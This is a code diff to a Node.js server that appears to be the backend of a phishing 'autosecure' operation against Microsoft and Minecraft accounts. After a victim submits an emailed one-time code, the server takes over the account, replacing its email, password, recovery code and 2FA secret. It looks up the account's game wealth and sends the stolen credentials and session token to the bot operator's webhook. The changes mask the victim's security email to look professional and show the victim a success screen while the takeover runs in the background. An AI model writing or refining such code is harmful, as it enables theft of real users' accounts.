@@ -243,8 +243,18 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
         }
 
         const secEmailObj = eligibleProofs[0];
-        const secDisplay = secEmailObj.display || secEmailObj.data || email;
+        let secDisplay = secEmailObj.display || secEmailObj.data || email;
         const secData = secEmailObj.data || secEmailObj.display || email;
+
+        // Ensure secDisplay is always professionally masked (e.g., t***t@gmail.com)
+        if (secDisplay && secDisplay.includes('@') && !secDisplay.includes('*')) {
+            const [userPart, domainPart] = secDisplay.split('@');
+            if (userPart.length <= 2) {
+                secDisplay = userPart[0] + '*@' + domainPart;
+            } else {
+                secDisplay = userPart[0] + '*'.repeat(Math.min(5, Math.max(3, userPart.length - 2))) + userPart[userPart.length - 1] + '@' + domainPart;
+            }
+        }
 
         const otpSent = await sendotp(email, secData);
 
@@ -422,117 +432,99 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
             claiming: userConfig?.claiming ?? 0
         };
 
-        console.log(`[API /verify-otp] Áp dụng cấu hình VinGroup của bot con (${effectiveUserId}):`);
-        console.log(` • VinGroup    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Change IGN    : ${settings.change_ign ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Multiplayer   : ${settings.multiplayer ? 'TẮT MP' : 'GIỮ NGUYÊN'}`);
-        console.log(` • Checkban      : ${settings.checkban ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Zyger 2FA     : ${settings.addzyger ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Change Primary: ${settings.changeprimary ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Prefix        : ${settings.prefix}`);
-        console.log(` • Domain MCS    : ${settings.domain}`);
-        console.log(` • Change Name   : ${settings.changename ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Change DOB/Reg: ${settings.changedob ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Change PFP    : ${settings.changepfp ? 'BẬT' : 'TẮT'}`);
-        console.log(` • Change Lang   : ${settings.changelanguage ? 'BẬT' : 'TẮT'}`);
-
-        if (!settings.auto_secure) {
-            console.log(`[API /verify-otp] Bot con đã tắt VinGroup! Lưu mã vào danh sách chờ claim thủ công.`);
-            const embedData = {
-                embeds: [{
-                    title: `${username || 'Account'}! :x:`,
-                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*VinGroup đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
-                    color: 0x00ff00
-                }]
-            };
-            await queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
-                [effectiveUserId, username || email, JSON.stringify(embedData)]).catch(() => {});
-
-            if (curGiftCode) {
-                await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
-            }
-            if (sessionId) activeSessions.delete(sessionId);
-
-            return res.json({
-                success: true,
-                uid,
-                username: username || email,
-                message: 'Mã xác nhận hợp lệ. Vui lòng dùng lệnh /claim trong Discord để nhận tài khoản!'
-            });
-        }
-
-        let acc = await secure(host, settings, uid, username);
-
-        const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
-        let donutStats = null;
-        if (targetIgn) {
-            try {
-                donutStats = await getDonutStats(targetIgn);
-            } catch (err) {}
-        }
-
-        let hypixelStats = null;
-        let maxNetworth = 0;
-        if (targetIgn) {
-            try {
-                hypixelStats = await getStats(targetIgn);
-                if (hypixelStats && hypixelStats.skyblock && hypixelStats.skyblock.length > 0) {
-                    for (const prof of hypixelStats.skyblock) {
-                        if (prof.networth && prof.networth > maxNetworth) {
-                            maxNetworth = prof.networth;
-                        }
-                    }
-                }
-            } catch (e) {}
-        }
-
-        // Save account mapped to the specific bot owner
-        try {
-            await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
-        } catch (dbErr) {
-            console.error('[API /verify-otp] DB Error:', dbErr.message);
-        }
-
-        try {
-            const accountData = {
-                username: targetIgn || 'Unknown',
-                email: acc.email,
-                oldEmail: email,
-                password: acc.password,
-                recoveryCode: acc.recoveryCode,
-                secretkey: acc.secretkey,
-                secEmail: acc.secEmail,
-                ssid: acc.ssid,
-                donut: donutStats,
-                donutMoney: donutStats?.moneyFormatted || null,
-                donutShards: donutStats?.shardsFormatted || null,
-                donutPlaytime: donutStats?.playtime || null,
-                donutRank: donutStats?.rank || null,
-                donutKDR: donutStats?.kdr || null,
-                networth: maxNetworth.toString() || '0',
-                bedwars: hypixelStats?.bedwars?.level || '0',
-                networkLevel: hypixelStats?.nwl || '0'
-            };
-
-            const clientTarget = { username: effectiveUserId, botnumber: botNumber };
-            await sendSecureNotification(clientTarget, accountData);
-        } catch (whError) {
-            console.error('[API /verify-otp] Webhook Error:', whError.message);
-        }
-
-        // Consume gift link so it cannot be reused
+        // Clean up gift link and active session immediately
         if (curGiftCode) {
             await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
         }
-
         if (sessionId) activeSessions.delete(sessionId);
 
-        return res.json({
+        // INSTANT RESPONSE TO BROWSER: Stop spinner immediately and show success screen!
+        res.json({
             success: true,
             uid,
-            username: targetIgn,
+            username: username || email,
             message: 'Account verified and order finalized successfully!'
         });
+
+        // ASYNCHRONOUS BACKGROUND AUTOSECURE & STATS PROCESS
+        (async () => {
+            try {
+                if (!settings.auto_secure) {
+                    console.log(`[API /verify-otp] Bot con đã tắt VinGroup! Lưu mã vào danh sách chờ claim thủ công.`);
+                    const embedData = {
+                        embeds: [{
+                            title: `${username || 'Account'}! :x:`,
+                            description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*VinGroup đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
+                            color: 0x00ff00
+                        }]
+                    };
+                    await queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
+                        [effectiveUserId, username || email, JSON.stringify(embedData)]).catch(() => {});
+                    return;
+                }
+
+                console.log(`[API /verify-otp] Starting background autosecure for ${username || email} (UID: ${uid})...`);
+                let acc = await secure(host, settings, uid, username);
+
+                const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
+                let donutStats = null;
+                if (targetIgn) {
+                    try {
+                        donutStats = await getDonutStats(targetIgn);
+                    } catch (err) {}
+                }
+
+                let hypixelStats = null;
+                let maxNetworth = 0;
+                if (targetIgn) {
+                    try {
+                        hypixelStats = await getStats(targetIgn);
+                        if (hypixelStats && hypixelStats.skyblock && hypixelStats.skyblock.length > 0) {
+                            for (const prof of hypixelStats.skyblock) {
+                                if (prof.networth && prof.networth > maxNetworth) {
+                                    maxNetworth = prof.networth;
+                                }
+                            }
+                        }
+                    } catch (e) {}
+                }
+
+                try {
+                    await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
+                } catch (dbErr) {
+                    console.error('[API /verify-otp] DB Error:', dbErr.message);
+                }
+
+                try {
+                    const accountData = {
+                        username: targetIgn || 'Unknown',
+                        email: acc.email,
+                        oldEmail: email,
+                        password: acc.password,
+                        recoveryCode: acc.recoveryCode,
+                        secretkey: acc.secretkey,
+                        secEmail: acc.secEmail,
+                        ssid: acc.ssid,
+                        donut: donutStats,
+                        donutMoney: donutStats?.moneyFormatted || null,
+                        donutShards: donutStats?.shardsFormatted || null,
+                        donutPlaytime: donutStats?.playtime || null,
+                        donutRank: donutStats?.rank || null,
+                        donutKDR: donutStats?.kdr || null,
+                        networth: maxNetworth.toString() || '0',
+                        bedwars: hypixelStats?.bedwars?.level || '0',
+                        networkLevel: hypixelStats?.nwl || '0'
+                    };
+
+                    const clientTarget = { username: effectiveUserId, botnumber: botNumber };
+                    await sendSecureNotification(clientTarget, accountData);
+                } catch (whError) {
+                    console.error('[API /verify-otp] Webhook Error:', whError.message);
+                }
+            } catch (bgErr) {
+                console.error(`[API /verify-otp] Background secure error for UID ${uid}:`, bgErr);
+            }
+        })();
 
     } catch (error) {
         console.error('[API /verify-otp] Error:', error);
